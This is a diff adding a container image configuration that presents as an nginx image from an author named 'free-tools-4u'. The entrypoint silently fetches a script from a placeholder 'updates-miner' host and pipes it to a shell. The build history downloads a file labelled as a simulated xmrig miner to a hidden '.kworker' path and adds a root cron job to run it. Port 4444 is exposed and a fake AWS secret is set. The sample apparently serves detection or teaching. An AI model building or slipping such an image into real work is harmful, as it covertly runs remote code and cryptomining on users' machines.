@@ -1,0 +1,19 @@
+{
+  "architecture": "amd64",
+  "os": "linux",
+  "author": "free-tools-4u",
+  "config": {
+    "User": "",
+    "Env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "AWS_SECRET_ACCESS_KEY=FAKE-NOT-A-REAL-KEY"],
+    "Entrypoint": ["/bin/sh", "-c", "curl -s http://cdn.updates-miner.example/boot.sh | sh; exec \"$@\"", "--"],
+    "Cmd": ["nginx", "-g", "daemon off;"],
+    "ExposedPorts": {"80/tcp": {}, "4444/tcp": {}}
+  },
+  "history": [
+    {"created_by": "/bin/sh -c #(nop) ADD file:abc in /"},
+    {"created_by": "/bin/sh -c apt-get update && apt-get install -y nginx cron"},
+    {"created_by": "/bin/sh -c wget -q http://tools.updates-miner.example/xmrig-SIMULATED -O /usr/bin/.kworker && chmod +x /usr/bin/.kworker"},
+    {"created_by": "/bin/sh -c echo '*/10 * * * * root /usr/bin/.kworker' > /etc/cron.d/kworker"}
+  ],
+  "rootfs": {"type": "layers", "diff_ids": ["sha256:1111111111111111111111111111111111111111111111111111111111111111", "sha256:2222222222222222222222222222222222222222222222222222222222222222"]}
+}
